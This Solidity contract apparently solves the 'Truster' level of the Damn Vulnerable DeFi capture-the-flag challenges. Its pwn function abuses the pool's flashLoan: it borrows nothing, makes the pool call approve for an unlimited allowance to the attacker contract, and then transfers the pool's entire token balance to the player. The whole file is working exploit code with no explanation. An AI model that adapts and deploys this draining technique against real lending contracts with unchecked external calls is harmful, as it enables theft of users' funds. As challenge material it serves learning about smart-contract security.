// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract TrusterHack {
    TrusterLenderPool public immutable pool;
    DamnValuableToken public immutable token;
    address player;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _player) {
        pool = _pool;
        token = _token;
        player = _player;
    }

    function pwn() external {
        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
        );
        token.transferFrom(address(pool), player, token.balanceOf(address(pool)));
    }
}
